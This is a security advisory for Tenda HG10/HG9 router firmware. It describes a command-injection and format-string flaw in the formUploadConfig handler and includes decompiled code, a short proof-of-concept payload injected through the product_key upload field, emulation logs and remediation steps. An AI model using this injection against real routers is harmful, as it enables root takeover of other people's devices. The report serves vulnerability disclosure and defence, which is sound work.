# Tenda HG10/HG9 V3.3.0-250113 was discovered to contain a command injection vulnerability in formUploadConfig

## Overview

- Vendor: Tenda
- Product: HG10/HG9 (HG7_HG9_HG10 family)
- Version: V3.3.0-250113
- Component: Boa formUploadConfig -> libmib.so td_AL_external_interface
- Vulnerability Class: CWE-78 command injection / CWE-134 format string
- Manufacturer: https://www.tendacn.com/

## Affected version

- Package `HG7_HG9_HG10re_300001138.zip`.
- `boa`.
- `libmib.so`.

## Vulnerability details

`formUploadConfig` reads the multipart field `product_key` into a 64-byte
buffer and passes it to `td_AL_external_interface`. That function only checks
`strlen(a1) < 0x18` (23 bytes), then concatenates the value into several shell
commands without quoting or escaping:

```c
if ( (unsigned int)strlen(a1) < 0x18 ) {
    sprintf(v10, a1);              /* also a format-string bug */
    strcat(v10, ".tar.gz");
    sprintf(v9, a1); strcat(v9, ".tar");
    sprintf(v8, "gunzip %s/%s -c > %s/%s", v15, v10, v15, v9); system(v8);
    sprintf(v8, "tar -xvf %s/%s -C %s", v15, v9, v15); system(v8);
    sprintf(v8, "cp -rf %s/%s/* %s", v15, a1, v14); system(v8);
    sprintf(v8, "echo %s> %s", a1, v12); system(v8);
}
```

`;`, backticks and `$()` are accepted. The first `gunzip` command is reached
before any real config validation.

## PoC

```python
# product_key is 23 bytes and satisfies the < 24 check.
# The upload also needs a tar.gz whose member path matches the key so the
# handler's access() check passes; the PoC builds both.
payload = b";echo PW>/dev/console;#"

# POST a multipart/form-data body to:
#   /boaform/formUploadConfig
# with the field name product_key and the payload as its value.
```

## Reproduction and terminal evidence

Environment: qemu-user chroot (handler/debug parse) and FirmAE full-system
(HG10/HG9 2025). Only `auth_authorize` was patched; `formUploadConfig`,
`td_AL_external_interface` and `system` are unchanged.

qemu-user Boa debug output:

```
[formUploadConfig:204] keybuff = ;echo PW>/dev/console;#
[formUploadConfig:217] flagbuff = 1
[td_AL_external_interface:44] input key: ;echo PW>/dev/console;#
[td_AL_external_interface:257] success completed
/dev/console: PW
```

FirmAE full-system serial output after the same POST:

```
PW
PW
PW
PW
```

The device then reboots because the success path calls `cmd_reboot()`; the
curl timeout after the POST is expected.

## Verification

The vulnerable handler in the stock `Boa formUploadConfig -> libmib.so td_AL_external_interface` was decompiled from the unpacked rootfs (code quoted above), and the stock binary was run under qemu/FirmAE; the transcript is shown above.

## Impact

Authenticated admin (or CSRF) root command execution. The same sink can also
be reached through the unauthenticated ATE `start_effect` path if an attacker
can stage `/tmp/custom_config.tar.gz`, but the Web handler itself is
admin-authenticated; this report does not merge the two paths.

## Remediation

- Enforce a strict allow-list for `product_key` and reject shell metacharacters.
- Replace `system()` with `execve`/argv for gunzip/tar/cp/echo.
- Fix `sprintf(v10, a1)` to `snprintf(v10, sizeof(v10), "%s", a1)`.
- Add CSRF tokens to the multipart upload handler.

## Known CVE relation

- CVE-2026-7151: Tenda HG3 `formUploadConfig` is described as a `destNet`
  stack overflow in `/boaform/formIPv6Routing`; this `product_key` ->
  `td_AL_external_interface` -> `system` chain is different.
- NVD `product_key` / `td_AL_external_interface`: 0 records (2026-11-06).

## Status and disclosure

Dynamic confirmation (qemu-user + FirmAE full-system; handler unchanged).
Candidate 0-day; CVE application in progress.

## Additional Information

```markdown
### Vendor
Tenda

### Product
HG10/HG9 (HG7_HG9_HG10 family)

### Version or Commit
V3.3.0-250113

### Vulnerability Class
CWE-78 command injection / CWE-134 format string

### CVE_status
CVE application in progress

### Description
formUploadConfig reads the multipart product_key into a 64-byte buffer and passes it to td_AL_external_interface, which only checks strlen < 0x18 before concatenating it into shell commands.

### Affected_component
Boa formUploadConfig -> libmib.so td_AL_external_interface

### Attack_vector
Authenticated multipart POST to /goform/formUploadConfig with a crafted product_key (up to 23 bytes).

### Product_version
HG10/HG9 (HG7_HG9_HG10 family) V3.3.0-250113

### Reference
- https://www.tendacn.com/
- https://github.com/vuln-1/vuln/blob/main/Tenda/HG10_HG9_V3.3.0-250113/report-3.md
```
